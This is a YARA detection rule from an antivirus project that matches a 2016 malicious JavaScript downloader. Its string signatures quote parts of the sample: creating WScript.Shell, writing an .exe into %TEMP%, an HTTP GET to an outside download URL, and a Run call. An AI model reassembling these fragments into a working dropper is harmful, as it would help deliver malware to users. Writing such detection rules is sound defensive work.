rule sig_20160328_af2c67e310dec85bdd7b515cbc8f0e9d {
  meta:
    description = "datamaliciousorder - file 20160328_af2c67e310dec85bdd7b515cbc8f0e9d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94d9977ff5c1eaec9680a7d90cfa67cd7ee18b444b77d857d4855402c2a6fde5"

  strings:
    $s1  = "function Mqgreojfo() {return Vtopmgcorp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"USiLpdqt.exe\";};" fullword ascii
    $s2  = "Mvgreaopxy[Iafmvdv](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Ihtfx](Wtybqrnnm() * 11)} while (Mvgreaopxy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Vtopmgcorp = function Sltvqr() {return WScript[Embjlramtx](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Fmqgtsyih(Lemgwvdaas, Ciphr){return Lemgwvdaas - Ciphr;};" fullword ascii
    $s6  = "function Vglaszwf() {return ((Foigxbom == true) && (Foigxbom == Ykumr)) ? 1 : Nodzoo;};" fullword ascii
    $s7  = "function Hoxrglzjy(Mdipmac){Vtopmgcorp[\"Run\"](Mdipmac, Nodzoo, Nodzoo);};" fullword ascii
    $s8  = "var Bszgyrmpay = new this[\"Date\"]();" fullword ascii
    $s9  = "var Ykumr = false;" fullword ascii
    $s10 = "Ykumr = true; " fullword ascii
    $s11 = "function Jhwygl(Gvplzry) {var Itqtbtw = (1, 2, 3, 4, 5, Gvplzry); return Itqtbtw;};" fullword ascii
    $s12 = "function Wtybqrnnm(){return 22;};" fullword ascii
    $s13 = " while (Zqvzipquv){" fullword ascii
    $s14 = "return Fmqgtsyih(Ubbsii, Prumclijac);" fullword ascii
    $s15 = "function Sopdekwp(){return Embjlramtx;};" fullword ascii
    $s16 = "function Ysmtdfb()" fullword ascii
    $s17 = "var Foigxbom = false;" fullword ascii
    $s18 = "function Ziuysotm(){return Eubpver;};" fullword ascii
    $s19 = "Foigxbom = true; " fullword ascii
    $s20 = "var Ipecgmgtr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}